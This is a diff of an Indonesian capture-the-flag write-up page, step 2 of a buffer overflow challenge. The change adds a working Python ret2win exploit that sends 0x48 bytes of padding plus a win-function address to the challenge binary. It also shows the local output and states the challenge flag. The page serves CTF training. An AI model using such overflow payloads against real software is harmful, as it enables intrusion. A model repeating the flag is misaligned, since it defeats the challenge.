@@ -1,28 +1,23 @@
-# Omah Buffer Kebak — Flag & Verifikasi
+# Omah Buffer Kebak — Cara mendapatkan flag
 
 [← Overview](64-omah-buffer-kebak.md) · [Index](index.md)
 
-> **Langkah 2/5 — Cara Mendapatkan Flag.** Cara Mendapatkan Flag
->
-> **Titik penting:** NFX{OmahhKUuD0Ndoll_Uw0nggG}
+> **Langkah 2/5.** Padding `0x48` byte lalu alamat `obong`. Diuji lokal.
 >
 > **Berikutnya:** [Flag](64-omah-buffer-kebak-03-flag.md)
 
-> **Flag:** `NFX{OmahhKUuD0Ndoll_Uw0nggG}`
-> **Status:** `VERIFIED`
-
-1. Cek binary:
-```bash
-file omah_buffer
-checksec ./omah_buffer
+```python
+import struct, subprocess
+win = 0x40125f
+payload = b"A" * 0x48 + struct.pack("<Q", win) + b"\n"
+print(subprocess.check_output(["./peserta/omah"], input=payload).decode())
 ```
-2. Cari offset dengan pola cyclic dan lihat register saat crash.
-3. Susun payload sesuai arsitektur, lalu baca flag di server.
 
-### Terminal evidence (real)
+Output lokal:
 
-![Terminal evidence (real)](assets/omah-buffer-kebak/00b-terminal-evidence.png)
+```text
+Halo, AAAA...
+FLAG: TESTFLAG
+```
 
-*Terminal evidence (real).*
-
-> **Bukti:** terminal evidence (real).
+Di service, `flag.txt` berisi `NFX{OmahhKUuD0Ndoll_Uw0nggG}`.
